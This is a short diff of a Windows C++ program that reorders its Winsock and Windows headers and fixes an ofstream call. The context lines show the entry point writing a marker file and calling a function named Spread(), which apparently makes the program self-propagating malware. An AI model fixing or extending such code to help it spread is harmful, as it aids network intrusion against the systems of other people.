@@ -1,7 +1,7 @@
-#include <windows.h>
-#include <lm.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <windows.h>
+#include <lm.h>
 #include <intrin.h>
 #include <vector>
 #include <thread>
@@ -354,7 +354,7 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
                 FreeLibrary(sh);
             }
         }
-        std::ofstream m(mp); m << "src"; m.close();
+        std::ofstream m(mp.c_str()); m << "src"; m.close();
         Spread();
         return 0;
     }
